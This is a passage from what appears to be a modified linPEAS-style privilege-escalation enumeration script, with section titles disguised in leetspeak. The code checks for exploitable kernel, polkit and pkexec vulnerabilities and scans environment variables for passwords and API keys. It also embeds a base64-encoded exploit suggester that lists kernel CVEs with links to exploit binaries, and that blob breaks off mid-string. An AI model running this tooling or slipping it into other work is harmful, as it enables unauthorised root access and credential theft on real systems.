"s,$kernelDCW_Rhel6_4,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Rhel7,${SED_RED_YELLOW}," | sed -${E} "s,$kernelB,${SED_RED},"
warn_exec lsb_release -a 2>/dev/null
if [ "$MACPEAS" ]; then
    warn_exec system_profiler SPSoftwareDataType
fi
echo ""

print_2title "5udo v3rs10n"
if [ "$(command -v sudo 2>/dev/null)" ]; then
print_info "5udo"
sudo -V 2>/dev/null | grep "Sudo ver" | sed -${E} "s,$sudovB,${SED_RED},"
else echo_not_found "sudo"
fi
echo ""

#-- SY) CVEs
print_2title "CV3s Ch3ck"

#-- SY) CVE-2021-4034
if [ `command -v pkexec` ] && stat -c '%a' $(which pkexec) | grep -q 4755 && [ "$(stat -c '%Y' $(which pkexec))" -lt "1641942000" ]; then 
    echo "Vuln3r4bl3 t0 CV3-2O21-4O34" | sed -${E} "s,.*,${SED_RED_YELLOW},"
    echo ""
fi


polkitVersion=$(systemctl status polkit.service 2>/dev/null | grep version | cut -d " " -f 9)
if [ "$(apt list --installed 2>/dev/null | grep polkit | grep -c 0.105-26)" -ge 1 ] || [ "$(yum list installed 2>/dev/null | grep polkit | grep -c 0.117-2)" -ge 1 ]; then
    echo "Vuln3r4bl3 t0 CV3-2O21-356O" | sed -${E} "s,.*,${SED_RED_YELLOW},"
    echo ""
fi

kernelversion=$(uname -r | awk -F"-" '{print $1}')
kernelnumber=$(echo $kernelversion | awk -F. '{ printf("%d%03d%03d%03d\n", $1,$2,$3,$4); }')
if [ $kernelnumber -ge 5008000000 ] && [ $kernelnumber -lt 5017000000 ]; then 
    echo "Potentially Vuln3r4bl3 t0 CV3-2O22-0847" | sed -${E} "s,.*,${SED_RED},"
    echo ""
fi

kernelversion=$(uname -r | awk -F"-" '{print $1}')
kernelnumber=$(echo $kernelversion | awk -F. '{ printf("%d%03d%03d%03d\n", $1,$2,$3,$4); }')
if [ $kernelnumber -ge 3017000000 ] && [ $kernelnumber -lt 5019000000 ]; then 
    echo "P0t3nt14lly Vuln3r4bl3 t0 CV3-2O22-2588" | sed -${E} "s,.*,${SED_RED},"
    echo ""
fi
echo ""

if (busctl list 2>/dev/null | grep -q com.ubuntu.USBCreator) || [ "$DEBUG" ]; then
    print_2title "USBCreator"
    print_info "create that thing you can plug in"

    pc_version=$(dpkg -l 2>/dev/null | grep policykit-desktop-privileges | grep -oP "[0-9][0-9a-zA-Z\.]+")
    if [ -z "$pc_version" ]; then
        pc_version=$(apt-cache policy policykit-desktop-privileges 2>/dev/null | grep -oP "\*\*\*.*" | cut -d" " -f2)
    fi
    if [ -n "$pc_version" ]; then
        pc_length=${#pc_version}
        pc_major=$(echo "$pc_version" | cut -d. -f1)
        pc_minor=$(echo "$pc_version" | cut -d. -f2)
        if [ "$pc_length" -eq 4 ] && [ "$pc_major" -eq 0 ] && [ "$pc_minor"  -lt 21 ]; then
            echo "Vulnerable!!" | sed -${E} "s,.*,${SED_RED},"
        fi
    fi
fi
echo ""



print_2title "PATH"
print_info "wr1t4bl3 p4th 4bu535"
if ! [ "$IAMROOT" ]; then
    echo "$OLDPATH" 2>/dev/null | sed -${E} "s,$Wfolders|\./|\.:|:\.,${SED_RED_YELLOW},g"
    echo "New path exported: $PATH" 2>/dev/null | sed -${E} "s,$Wfolders|\./|\.:|:\. ,${SED_RED_YELLOW},g"
else
    echo "New path exported: $PATH" 2>/dev/null
fi
echo ""


print_2title "Date & uptime"
warn_exec date 2>/dev/null
warn_exec uptime 2>/dev/null
echo ""

if [ "$EXTRA_CHECKS" ]; then
    print_2title "System stats"
    (df -h || lsblk) 2>/dev/null || echo_not_found "df and lsblk"
    warn_exec free 2>/dev/null
    echo ""
fi

if [ "$EXTRA_CHECKS" ]; then
    print_2title "CPU info"
    warn_exec lscpu 2>/dev/null
    echo ""
fi

if [ -d "/dev" ] || [ "$DEBUG" ] ; then
    print_2title "Any sd*/disk* disk in /dev? (limit 20)"
    ls /dev 2>/dev/null | grep -Ei "^sd|^disk" | sed "s,crypt,${SED_RED}," | head -n 20
    echo ""
fi

if [ -f "/etc/fstab" ] || [ "$DEBUG" ]; then
    print_2title "Unmounted file-system?"
    print_info "Check if you can mount umounted devices"
    grep -v "^#" /etc/fstab 2>/dev/null | grep -Ev "\W+\#|^#" | sed -${E} "s,$mountG,${SED_GREEN},g" | sed -${E} "s,$notmounted,${SED_RED},g" | sed -${E} "s%$mounted%${SED_BLUE}%g" | sed -${E} "s,$Wfolders,${SED_RED}," | sed -${E} "s,$mountpermsB,${SED_RED},g" | sed -${E} "s,$mountpermsG,${SED_GREEN},g"
    echo ""
fi

if ([ "$(command -v diskutil)" ] || [ "$DEBUG" ]) && [ "$EXTRA_CHECKS" ]; then
    print_2title "Mounted disks information"
    warn_exec diskutil list
    echo ""
fi

if [ "$(command -v smbutil)" ] || [ "$DEBUG" ]; then
    print_2title "Mounted SMB Shares"
    warn_exec smbutil statshares -a
    echo ""
fi


print_2title "Environment"
print_info "Any private information inside environment variables?"
(env || printenv || set) 2>/dev/null | grep -v "RELEVANT*|FIND*|^VERSION=|dbuslistG|mygroups|ldsoconfdG|pwd_inside_history|kernelDCW_Ubuntu_Precise|kernelDCW_Ubuntu_Trusty|kernelDCW_Ubuntu_Xenial|kernelDCW_Rhel|^sudovB=|^rootcommon=|^mounted=|^mountG=|^notmounted=|^mountpermsB=|^mountpermsG=|^kernelB=|^C=|^RED=|^GREEN=|^Y=|^B=|^NC=|TIMEOUT=|groupsB=|groupsVB=|knw_grps=|sidG|sidB=|sidVB=|sidVB2=|sudoB=|sudoG=|sudoVB=|timersG=|capsB=|notExtensions=|Wfolders=|writeB=|writeVB=|_usrs=|compiler=|PWD=|LS_COLORS=|pathshG=|notBackup=|processesDump|processesB|commonrootdirs|USEFUL_SOFTWARE|PSTORAGE_KUBERNETES" | sed -${E} "s,[pP][wW][dD]|[pP][aA][sS][sS][wW]|[aA][pP][iI][kK][eE][yY]|[aA][pP][iI][_][kK][eE][yY]|KRB5CCNAME,${SED_RED},g" || echo_not_found "env || set"
echo ""


if [ "$(command -v dmesg 2>/dev/null)" ] || [ "$DEBUG" ]; then
    print_2title "Searching Signature verification failed in dmesg"
    print_info "soz card declined nah jk"
    (dmesg 2>/dev/null | grep "signature") || echo_not_found "dmesg"
    echo ""
fi


if [ "$MACPEAS" ]; then
    print_2title "Kernel Extensions not belonging to apple"
    kextstat 2>/dev/null | grep -Ev " com.apple."

    print_2title "Unsigned Kernel Extensions"
    macosNotSigned /Library/Extensions
    macosNotSigned /System/Library/Extensions
fi

if [ "$(command -v bash 2>/dev/null)" ]; then
    print_2title "Executing Linux Exploit Suggester"
    print_info "https://github.com/mzet-/linux-exploit-suggester"
    les_b64="IyEvYmluL2Jhc2gKCiMKIyBDb3B5cmlnaHQgKGMpIDIwMTYtMjAyMiwgQF9temV0XwojCiMgbGludXgtZXhwbG9pdC1zdWdnZXN0ZXIuc2ggY29tZXMgd2l0aCBBQlNPTFVURUxZIE5PIFdBUlJBTlRZLgojIFRoaXMgaXMgZnJlZSBzb2Z0d2FyZSwgYW5kIHlvdSBhcmUgd2VsY29tZSB0byByZWRpc3RyaWJ1dGUgaXQKIyB1bmRlciB0aGUgdGVybXMgb2YgdGhlIEdOVSBHZW5lcmFsIFB1YmxpYyBMaWNlbnNlLiBTZWUgTElDRU5TRQojIGZpbGUgZm9yIHVzYWdlIG9mIHRoaXMgc29mdHdhcmUuCiMKClZFUlNJT049djEuMQoKIyBiYXNoIGNvbG9ycwojdHh0cmVkPSJcZVswOzMxbSIKdHh0cmVkPSJcZVs5MTsxbSIKdHh0Z3JuPSJcZVsxOzMybSIKdHh0Z3JheT0iXGVbMDszN20iCnR4dGJsdT0iXGVbMDszNm0iCnR4dHJzdD0iXGVbMG0iCmJsZHdodD0nXGVbMTszN20nCndodD0nXGVbMDszNm0nCmJsZGJsdT0nXGVbMTszNG0nCnllbGxvdz0nXGVbMTs5M20nCmxpZ2h0eWVsbG93PSdcZVswOzkzbScKCiMgaW5wdXQgZGF0YQpVTkFNRV9BPSIiCgojIHBhcnNlZCBkYXRhIGZvciBjdXJyZW50IE9TCktFUk5FTD0iIgpPUz0iIgpESVNUUk89IiIKQVJDSD0iIgpQS0dfTElTVD0iIgoKIyBrZXJuZWwgY29uZmlnCktDT05GSUc9IiIKCkNWRUxJU1RfRklMRT0iIgoKb3B0X2ZldGNoX2JpbnM9ZmFsc2UKb3B0X2ZldGNoX3NyY3M9ZmFsc2UKb3B0X2tlcm5lbF92ZXJzaW9uPWZhbHNlCm9wdF91bmFtZV9zdHJpbmc9ZmFsc2UKb3B0X3BrZ2xpc3RfZmlsZT1mYWxzZQpvcHRfY3ZlbGlzdF9maWxlPWZhbHNlCm9wdF9jaGVja3NlY19tb2RlPWZhbHNlCm9wdF9mdWxsPWZhbHNlCm9wdF9zdW1tYXJ5PWZhbHNlCm9wdF9rZXJuZWxfb25seT1mYWxzZQpvcHRfdXNlcnNwYWNlX29ubHk9ZmFsc2UKb3B0X3Nob3dfZG9zPWZhbHNlCm9wdF9za2lwX21vcmVfY2hlY2tzPWZhbHNlCm9wdF9za2lwX3BrZ192ZXJzaW9ucz1mYWxzZQoKQVJHUz0KU0hPUlRPUFRTPSJoVmZic3U6azpkcDpnIgpMT05HT1BUUz0iaGVscCx2ZXJzaW9uLGZ1bGwsZmV0Y2gtYmluYXJpZXMsZmV0Y2gtc291cmNlcyx1bmFtZTosa2VybmVsOixzaG93LWRvcyxwa2dsaXN0LWZpbGU6LHNob3J0LGtlcm5lbHNwYWNlLW9ubHksdXNlcnNwYWNlLW9ubHksc2tpcC1tb3JlLWNoZWNrcyxza2lwLXBrZy12ZXJzaW9ucyxjdmVsaXN0LWZpbGU6LGNoZWNrc2VjIgoKIyMgZXhwbG9pdHMgZGF0YWJhc2UKZGVjbGFyZSAtYSBFWFBMT0lUUwpkZWNsYXJlIC1hIEVYUExPSVRTX1VTRVJTUEFDRQoKIyMgdGVtcG9yYXJ5IGFycmF5IGZvciBwdXJwb3NlIG9mIHNvcnRpbmcgZXhwbG9pdHMgKGJhc2VkIG9uIGV4cGxvaXRzJyByYW5rKQpkZWNsYXJlIC1hIGV4cGxvaXRzX3RvX3NvcnQKZGVjbGFyZSAtYSBTT1JURURfRVhQTE9JVFMKCiMjIyMjIyMjIyMjIyBMSU5VWCBLRVJORUxTUEFDRSBFWFBMT0lUUyAjIyMjIyMjIyMjIyMjIyMjIyMjIwpuPTAKCkVYUExPSVRTWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAwNC0xMjM1XSR7dHh0cnN0fSBlbGZsYmwKUmVxczogcGtnPWxpbnV4LWtlcm5lbCx2ZXI9Mi40LjI5ClRhZ3M6ClJhbms6IDEKYW5hbHlzaXMtdXJsOiBodHRwOi8vaXNlYy5wbC92dWxuZXJhYmlsaXRpZXMvaXNlYy0wMDIxLXVzZWxpYi50eHQKYmluLXVybDogaHR0cHM6Ly93ZWIuYXJjaGl2ZS5vcmcvd2ViLzIwMTExMTAzMDQyOTA0L2h0dHA6Ly90YXJhbnR1bGEuYnkucnUvbG9jYWxyb290LzIuNi54L2VsZmxibApleHBsb2l0LWRiOiA3NDQKRU9GCikKCkVYUExPSVRTWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAwNC0xMjM1XSR7dHh0cnN0fSB1c2VsaWIoKQpSZXFzOiBwa2c9bGludXgta2VybmVsLHZlcj0yLjQuMjkKVGFnczoKUmFuazogMQphbmFseXNpcy11cmw6IGh0dHA6Ly9pc2VjLnBsL3Z1bG5lcmFiaWxpdGllcy9pc2VjLTAwMjEtdXNlbGliLnR4dApleHBsb2l0LWRiOiA3NzgKQ29tbWVudHM6IEtub3duIHRvIHdvcmsgb25seSBmb3IgMi40IHNlcmllcyAoZXZlbiB0aG91Z2ggMi42IGlzIGFsc28gdnVsbmVyYWJsZSkKRU9GCikKCkVYUExPSVRTWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAwNC0xMjM1XSR7dHh0cnN0fSBrcmFkMwpSZXFzOiBwa2c9bGludXgta2VybmVsLHZlcj49Mi42LjUsdmVyPD0yLjYuMTEKVGFnczoKUmFuazogMQpleHBsb2l0LWRiOiAxMzk3CkVPRgopCgpFWFBMT0lUU1soKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMDQtMDA3N10ke3R4dHJzdH0gbXJlbWFwX3B0ZQpSZXFzOiBwa2c9bGludXgta2VybmVsLHZlcj49Mi42LjAsdmVyPD0yLjYuMgpUYWdzOgpSYW5rOiAxCmV4cGxvaXQtZGI6IDE2MApFT0YKKQoKRVhQTE9JVFNbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDA2LTI0NTFdJHt0eHRyc3R9IHJhcHRvcl9wcmN0bApSZXFzOiBwa2c9bGludXgta2VybmVsLHZlcj49Mi42LjEzLHZlcjw9Mi42LjE3ClRhZ3M6ClJhbms6IDEKZXhwbG9pdC1kYjogMjAzMQpFT0YKKQoKRVhQTE9JVFNbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDA2LTI0NTFdJHt0eHRyc3R9IHByY3RsClJlcXM6IHBrZz1saW51eC1rZXJuZWwsdmVyPj0yLjYuMTMsdmVyPD0yLjYuMTcKVGFnczoKUmFuazogMQpleHBsb2l0LWRiOiAyMDA0CkVPRgopCgpFWFBMT0lUU1soKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMDYtMjQ1MV0ke3R4dHJzdH0gcHJjdGwyClJlcXM6IHBrZz1saW51eC1rZXJuZWwsdmVyPj0yLjYuMTMsdmVyPD0yLjYuMTcKVGFnczoKUmFuazogMQpleHBsb2l0LWRiOiAyMDA1CkVPRgopCgpFWFBMT0lUU1soKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMDYtMjQ1MV0ke3R4dHJzdH0gcHJjdGwzClJlcXM6IHBrZz1saW51eC1rZXJuZWwsdmVyPj0yLjYuMTMsdmVyPD0yLjYuMTcKVGFnczoKUmFuazogMQpleHBsb2l0LWRiOiAyMDA2CkVPRgopCgpFWFBMT0lUU1soKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMDYtMjQ1MV0ke3R4dHJzdH0gcHJjdGw0ClJlcXM6IHBrZz1saW51eC1rZXJuZWwsdmVyPj0yLjYuMTMsdmVyPD0yLjYuMTcKVGFnczoKUmFuazogMQpleHBsb2l0LWRiOiAyMDExCkVPRgopCgpFWFBMT0lUU1soKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMDYtMzYyNl0ke3R4dHJzdH0gaDAwbHlzaGl0ClJlcXM6IHBrZz1saW51eC1rZXJuZWwsdmVyPj0yLjYuOCx2ZXI8PTIuNi4xNgpUYWdzOgpSYW5rOiAxCmJpbi11cmw6IGh0dHBzOi8vd2ViLmFyY2hpdmUub3JnL3dlYi8yMDExMTEwMzA0MjkwNC9odHRwOi8vdGFyYW50dWxhLmJ5LnJ1L2xvY2Fscm9vdC8yLjYueC9oMDBseXNoaXQKZXhwbG9pdC1kYjogMjAxMwpFT0YKKQoKRVhQTE9JVFNbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDA4LTA2MDBdJHt0eHRyc3R9IHZtc3BsaWNlMQpSZXFzOiBwa2c9bGludXgta2VybmVsLHZlcj49Mi42LjE3LHZlcjw9Mi42LjI0ClRhZ3M6ClJhbms6IDEKZXhwbG9pdC1kYjogNTA5MgpFT0YKKQoKRVhQTE9JVFNbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDA4LTA2MDBdJHt0eHRyc3R9IHZtc3BsaWNlMgpSZXFzOiBwa2c9bGludXgta2VybmVsLHZlcj49Mi42LjIzLHZlcjw9Mi42LjI0ClRhZ3M6ClJhbms6IDEKZXhwbG9pdC1kYjogNTA5MwpFT0YKKQoKRVhQTE9JVFNbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDA4LTQyMTBdJHt0eHRyc3R9IGZ0cmV4ClJlcXM6IHBrZz1saW51eC1rZXJuZWwsdmVyPj0yLjYuMTEsdmVyPD0yLjYuMjIKVGFnczoKUmFuazogMQpleHBsb2l0LWRiOiA2ODUxCkNvbW1lbnRzOiB3b3JsZC13cml0YWJsZSBzZ2lkIGRpcmVjdG9yeSBhbmQgc2hlbGwgdGhhdCBkb2VzIG5vdCBkcm9wIHNnaWQgcHJpdnMgdXBvbiBleGVjIChhc2gvc2FzaCkgYXJlIHJlcXVpcmVkCkVPRgopCgpFWFBMT0lUU1soKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMDgtNDIxMF0ke3R4dHJzdH0gZXhpdF9ub3RpZnkKUmVxczogcGtnPWxpbnV4LWtlcm5lbCx2ZXI+PTIuNi4yNSx2ZXI8PTIuNi4yOQpUYWdzOgpSYW5rOiAxCmV4cGxvaXQtZGI6IDgzNjkKRU9GCikKCkVYUExPSVRTWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAwOS0yNjkyXSR7dHh0cnN0fSBzb2NrX3NlbmRwYWdlIChzaW1wbGUgdmVyc2lvbikKUmVxczogcGtnPWxpbnV4LWtlcm5lbCx2ZXI+PTIuNi4wLHZlcjw9Mi42LjMwClRhZ3M6IHVidW50dT03LjEwLFJIRUw9NCxmZWRvcmE9NHw1fDZ8N3w4fDl8MTB8MTEKUmFuazogMQpleHBsb2l0LWRiOiA5NDc5CkNvbW1lbnRzOiBXb3JrcyBmb3Igc3lzdGVtcyB3aXRoIC9wcm9jL3N5cy92bS9tbWFwX21pbl9hZGRyIGVxdWFsIHRvIDAKRU9GCikKCkVYUExPSVRTWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAwOS0yNjkyLENWRS0yMDA5LTE4OTVdJHt0eHRyc3R9IHNvY2tfc2VuZHBhZ2UKUmVxczogcGtnPWxpbnV4LWtlcm5lbCx2ZXI+PTIuNi4wLHZlcjw9Mi42LjMwClRhZ3M6IHVidW50dT05LjA0ClJhbms6IDEKYW5hbHlzaXMtdXJsOiBodHRwczovL3hvcmwud29yZHByZXNzLmNvbS8yMDA5LzA3LzE2L2N2ZS0yMDA5LTE4OTUtbGludXgta2VybmVsLXBlcl9jbGVhcl9vbl9zZXRpZC1wZXJzb25hbGl0eS1ieXBhc3MvCnNyYy11cmw6IGh0dHBzOi8vZ2l0aHViLmNvbS9vZmZlbnNpdmUtc2VjdXJpdHkvZXhwbG9pdC1kYXRhYmFzZS1iaW4tc3Bsb2l0cy9yYXcvbWFzdGVyL2Jpbi1zcGxvaXRzLzk0MzUudGd6CmV4cGxvaXQtZGI6IDk0MzUKQ29tbWVudHM6IC9wcm9jL3N5cy92bS9tbWFwX21pbl9hZGRyIG5lZWRzIHRvIGVxdWFsIDAgT1IgcHVsc2VhdWRpbyBuZWVkcyB0byBiZSBpbnN0YWxsZWQKRU9GCikKCkVYUExPSVRTWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAwOS0yNjkyLENWRS0yMDA5LTE4OTVdJHt0eHRyc3R9IHNvY2tfc2VuZHBhZ2UyClJlcXM6IHBrZz1saW51eC1rZXJuZWwsdmVyPj0yLjYuMCx2ZXI8PTIuNi4zMApUYWdzOiAKUmFuazogMQpzcmMtdXJsOiBodHRwczovL2dpdGh1Yi5jb20vb2ZmZW5zaXZlLXNlY3VyaXR5L2V4cGxvaXQtZGF0YWJhc2UtYmluLXNwbG9pdHMvcmF3L21hc3Rlci9iaW4tc3Bsb2l0cy85NDM2LnRnegpleHBsb2l0LWRiOiA5NDM2CkNvbW1lbnRzOiBXb3JrcyBmb3Igc3lzdGVtcyB3aXRoIC9wcm9jL3N5cy92bS9tbWFwX21pbl9hZGRyIGVxdWFsIHRvIDAKRU9GCikKCkVYUExPSVRTWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAwOS0yNjkyLENWRS0yMDA5LTE4OTVdJHt0eHRyc3R9IHNvY2tfc2VuZHBhZ2UzClJlcXM6IHBrZz1saW51eC1rZXJuZWwsdmVyPj0yLjYuMCx2ZXI8PTIuNi4zMApUYWdzOiAKUmFuazogMQpzcmMtdXJsOiBodHRwczovL2dpdGh1Yi5jb20vb2ZmZW5zaXZlLXNlY3VyaXR5L2V4cGxvaXQtZGF0YWJhc2UtYmluLXNwbG9pdHMvcmF3L21hc3Rlci9iaW4tc3Bsb2l0cy85NjQxLnRhci5negpleHBsb2l0LWRiOiA5NjQxCkNvbW1lbnRzOiAvcHJvYy9zeXMvdm0vbW1hcF9taW5fYWRkciBuZWVkcyB0byBlcXVhbCAwIE9SIHB1bHNlYXVkaW8gbmVlZHMgdG8gYmUgaW5zdGFsbGVkCkVPRgopCgpFWFBMT0lUU1soKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMDktMjY5MixDVkUtMjAwOS0xODk1XSR7dHh0cnN0fSBzb2NrX3NlbmRwYWdlIChwcGMpClJlcXM6IHBrZz1saW51eC1rZXJuZWwsdmVyPj0yLjYuMCx2ZXI8PTIuNi4zMApUYWdzOiB1YnVudHU9OC4xMCxSSEVMPTR8NQpSYW5rOiAxCmV4cGxvaXQtZGI6IDk1NDUKQ29tbWVudHM6IC9wcm9jL3N5cy92bS9tbWFwX21pbl9hZGRyIG5lZWRzIHRvIGVxdWFsIDAKRU9GCikKCkVYUExPSVRTWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAwOS0yNjk4XSR7dHh0cnN0fSB0aGUgcmViZWwgKHVkcF9zZW5kbXNnKQpSZXFzOiBwa2c9bGludXgta2VybmVsLHZlcj49Mi42LjEsdmVyPD0yLjYuMTkKVGFnczogZGViaWFuPTQKUmFuazogMQpzcmMtdXJsOiBodHRwczovL2dpdGh1Yi5jb20vb2ZmZW5zaXZlLXNlY3VyaXR5L2V4cGxvaXQtZGF0YWJhc2UtYmluLXNwbG9pdHMvcmF3L21hc3Rlci9iaW4tc3Bsb2l0cy85NTc0LnRnegpleHBsb2l0LWRiOiA5NTc0CmFuYWx5c2lzLXVybDogaHR0cHM6Ly9ibG9nLmNyMC5vcmcvMjAwOS8wOC9jdmUtMjAwOS0yNjk4LXVkcHNlbmRtc2ctdnVsbmVyYWJpbGl0eS5odG1sCmF1dGhvcjogc3BlbmRlcgpDb21tZW50czogL3Byb2Mvc3lzL3ZtL21tYXBfbWluX2FkZHIgbmVlZHMgdG8gZXF1YWwgMCBPUiBwdWxzZWF1ZGlvIG5lZWRzIHRvIGJlIGluc3RhbGxlZApFT0YKKQoKRVhQTE9JVFNbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDA5LTI2OThdJHt0eHRyc3R9IGhvYWdpZV91ZHBfc2VuZG1zZwpSZXFzOiBwa2c9bGludXgta2VybmVsLHZlcj49Mi42LjEsdmVyPD0yLjYuMTkseDg2ClRhZ3M6IGRlYmlhbj00ClJhbms6IDEKZXhwbG9pdC1kYjogOTU3NQphbmFseXNpcy11cmw6IGh0dHBzOi8vYmxvZy5jcjAub3JnLzIwMDkvMDgvY3ZlLTIwMDktMjY5OC11ZHBzZW5kbXNnLXZ1bG5lcmFiaWxpdHkuaHRtbAphdXRob3I6IGFuZGkKQ29tbWVudHM6IFdvcmtzIGZvciBzeXN0ZW1zIHdpdGggL3Byb2Mvc3lzL3ZtL21tYXBfbWluX2FkZHIgZXF1YWwgdG8gMApFT0YKKQoKRVhQTE9JVFNbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDA5LTI2OThdJHt0eHRyc3R9IGthdG9uICh1ZHBfc2VuZG1zZykKUmVxczogcGtnPWxpbnV4LWtlcm5lbCx2ZXI+PTIuNi4xLHZlcjw9Mi42LjE5LHg4NgpUYWdzOiBkZWJpYW49NApSYW5rOiAxCnNyYy11cmw6IGh0dHBzOi8vZ2l0aHViLmNvbS9LYWJvdC9Vbml4LVByaXZpbGVnZS1Fc2NhbGF0aW9uLUV4cGxvaXRzLVBhY2svcmF3L21hc3Rlci8yMDA5L0NWRS0yMDA5LTI2OTgva2F0b24uYwphbmFseXNpcy11cmw6IGh0dHBzOi8vYmxvZy5jcjAub3JnLzIwMDkvMDgvY3ZlLTIwMDktMjY5OC11ZHBzZW5kbXNnLXZ1bG5lcmFiaWxpdHkuaHRtbAphdXRob3I6IFZ4SGVsbCBMYWJzCkNvbW1lbnRzOiBXb3JrcyBmb3Igc3lzdGVtcyB3aXRoIC9wcm9jL3N5cy92bS9tbWFwX21pbl9hZGRyIGVxdWFsIHRvIDAKRU9GCikKCkVYUExPSVRTWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAwOS0yNjk4XSR7dHh0cnN0fSBpcF9hcHBlbmRfZGF0YQpSZXFzOiBwa2c9bGludXgta2VybmVsLHZlcj49Mi42LjEsdmVyPD0yLjYuMTkseDg2ClRhZ3M6IGZlZG9yYT00fDV8NixSSEVMPTQKUmFuazogMQphbmFseXNpcy11cmw6IGh0dHBzOi8vYmxvZy5jcjAub3JnLzIwMDkvMDgvY3ZlLTIwMDktMjY5OC11ZHBzZW5kbXNnLXZ1bG5lcmFiaWxpdHkuaHRtbApleHBsb2l0LWRiOiA5NTQyCmF1dGhvcjogcDBjNzNuMQpDb21tZW50czogV29ya3MgZm9yIHN5c3RlbXMgd2l0aCAvcHJvYy9zeXMvdm0vbW1hcF9taW5fYWRkciBlcXVhbCB0byAwCkVPRgopCgpFWFBMT0lUU1soKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMDktMzU0N10ke3R4dHJzdH0gcGlwZS5jIDEKUmVxczogcGtnPWxpbnV4LWtlcm5lbCx2ZXI+PTIuNi4wLHZlcjw9Mi42LjMxClRhZ3M6ClJhbms6IDEKZXhwbG9pdC1kYjogMzMzMjEKRU9GCikKCkVYUExPSVRTWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAwOS0zNTQ3XSR7dHh0cnN0fSBwaXBlLmMgMgpSZXFzOiBwa2c9bGludXgta2VybmVsLHZlcj49Mi42LjAsdmVyPD0yLjYuMzEKVGFnczoKUmFuazogMQpleHBsb2l0LWRiOiAzMzMyMgpFT0YKKQoKRVhQTE9JVFNbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDA5LTM1NDddJHt0eHRyc3R9IHBpcGUuYyAzClJlcXM6IHBrZz1saW51eC1rZXJuZWwsdmVyPj0yLjYuMCx2ZXI8PTIuNi4zMQpUYWdzOgpSYW5rOiAxCmV4cGxvaXQtZGI6IDEwMDE4CkVPRgopCgpFWFBMT0lUU1soKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMTAtMzMwMV0ke3R4dHJzdH0gcHRyYWNlX2ttb2QyClJlcXM6IHBrZz1saW51eC1rZXJuZWwsdmVyPj0yLjYuMjYsdmVyPD0yLjYuMzQKVGFnczogZGViaWFuPTYuMHtrZXJuZWw6Mi42LigzMnwzM3wzNHwzNSktKDF8Mnx0cnVuayktYW1kNjR9LHVidW50dT0oMTAuMDR8MTAuMTApe2tlcm5lbDoyLjYuKDMyfDM1KS0oMTl8MjF8MjQpLXNlcnZlcn0KUmFuazogMQpiaW4tdXJsOiBodHRwczovL3dlYi5hcmNoaXZlLm9yZy93ZWIvMjAxMTExMDMwNDI5MDQvaHR0cDovL3RhcmFudHVsYS5ieS5ydS9sb2NhbHJvb3QvMi42Lngva21vZDIKYmluLXVybDogaHR0cHM6Ly93ZWIuYXJjaGl2ZS5vcmcvd2ViLzIwMTExMTAzMDQyOTA0L2h0dHA6Ly90YXJhbnR1bGEuYnkucnUvbG9jYWxyb290LzIuNi54L3B0cmFjZS1rbW9kCmJpbi11cmw6IGh0dHBzOi8vd2ViLmFyY2hpdmUub3JnL3dlYi8yMDE2MDYwMjE5MjY0MS9odHRwczovL3d3dy5rZXJuZWwtZXhwbG9pdHMuY29tL21lZGlhL3B0cmFjZV9rbW9kMi02NApleHBsb2l0LWRiOiAxNTAyMwpFT0YKKQoKRVhQTE9JVFNbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDEwLTExNDZdJHt0eHRyc3R9IHJlaXNlcmZzClJlcXM6IHBrZz1saW51eC1rZXJuZWwsdmVyPj0yLjYuMTgsdmVyPD0yLjYuMzQKVGFnczogdWJ1bnR1PTkuMTAKUmFuazogMQphbmFseXNpcy11cmw6IGh0dHBzOi8vam9uLm9iZXJoZWlkZS5vcmcvYmxvZy8yMDEwLzA0LzEwL3JlaXNlcmZzLXJlaXNlcmZzX3ByaXYtdnVsbmVyYWJpbGl0eS8Kc3JjLXVybDogaHR0cHM6Ly9qb24ub2JlcmhlaWRlLm9yZy9maWx